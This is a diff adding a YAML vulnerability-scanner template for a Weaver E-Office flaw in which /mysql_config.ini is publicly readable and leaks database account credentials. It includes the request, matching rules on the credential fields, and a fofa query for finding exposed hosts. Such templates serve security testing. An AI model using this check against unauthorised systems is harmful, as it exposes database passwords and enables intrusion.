@@ -1,0 +1,24 @@
+id: eoffice-mysql-config-disclosure
+
+info:
+  name: 泛微OA E-Office mysql_config.ini 数据库信息泄漏
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    泛微 E-Office mysql_config.ini文件可直接访问,泄漏数据库账号密码等信息
+    fofa: app="泛微-EOffice"
+  tags: ecology,disclosure
+  created: 2023/10/29
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /mysql_config.ini
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'dataurl') && 
+      response.body.bcontains(b'datauser') && 
+      response.body.bcontains(b'datapassword')
+expression: r0()
